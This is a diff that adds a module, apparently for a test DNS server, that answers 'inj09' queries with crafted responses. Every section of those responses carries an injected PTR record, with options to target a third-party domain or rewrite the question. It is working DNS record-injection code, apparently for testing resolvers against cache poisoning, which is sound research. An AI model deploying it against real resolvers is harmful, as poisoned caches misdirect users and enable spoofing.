@@ -1,0 +1,52 @@
+[module]
+name = "inj09"
+info = "Injection 9 - Only injected PTR record in all sections"
+desc = "Respond only with injected PTR record (6.6.6.6 -> inj09poc.yourdomain.com) in all sections."
+type = "feature"
+author = "ivan.jedek@oryxlabs.com"
+
+code = '''
+if req.first_subdomain.startswith("inj09"):
+   # Send only an injected PTR record in all sections
+   injdom = "9.6.6.6.in-addr.arpa"
+   cust_type_bin = req.type_bin  # question type (keep original "A", but we may replace it with "PTR")
+   addedquestions = b''
+   if "3rdparty" in req.subdomains:  # inject a 3rd party domain
+      targetdom = "injected09." + a3rdparty_domain
+   else:
+      targetdom = "injected09." + req.sld_tld_domain
+   if "replq" in req.subdomains:  # replace the question with our injected stuffs
+      orig_req_domain = req.full_domain
+      cust_type_bin = getTypeBin("PTR") # replace the question type
+      req.full_domain = injdom
+      addcustomlog("REPLQ")
+   if "addq" in req.subdomains:  # add additional question for our injected stuffs
+      resp.QURR = req.QURR+1
+      addedquestions  = convDom2Bin(injdom) + getTypeBin("PTR") + req.class_bin
+      addcustomlog("ADDQ")
+   ### DNS header ########
+   buffer = prep_dns_header(b'\x84\x00', resp.QURR, 1, 1, 1)
+   ### QUESTION SECTION ########
+   if resp.noq: buffer += convDom2Bin(req.full_domain) + cust_type_bin + req.class_bin
+   buffer += addedquestions
+   ### ANSWER SECTION ########
+   # injected PTR
+   buffer += convDom2Bin(injdom) + getTypeBin("PTR") + getClassBin("IN")
+   buffer += struct.pack(">L", resp.TTL)                 ## TTL
+   buffer += struct.pack(">H", len(targetdom)+2)         ## Data length
+   buffer += convDom2Bin(targetdom)                      ## PTR
+   ### AUTHORITY SECTION ########
+   buffer += convDom2Bin(injdom) + getTypeBin("PTR") + getClassBin("IN")
+   buffer += struct.pack(">L", resp.TTL)                 ## TTL
+   buffer += struct.pack(">H", len(targetdom)+2)         ## Data length
+   buffer += convDom2Bin(targetdom)                      ## PTR
+   ### ADDITIONAL SECTION ########
+   buffer += convDom2Bin(injdom) + getTypeBin("PTR") + getClassBin("IN")
+   buffer += struct.pack(">L", resp.TTL)                 ## TTL
+   buffer += struct.pack(">H", len(targetdom)+2)         ## Data length
+   buffer += convDom2Bin(targetdom)                      ## PTR
+   # log and send
+   log("PTR %s -> %s in ALL sections" % (injdom, targetdom))
+   send_buf(self, buffer)
+   #####################################################################
+'''
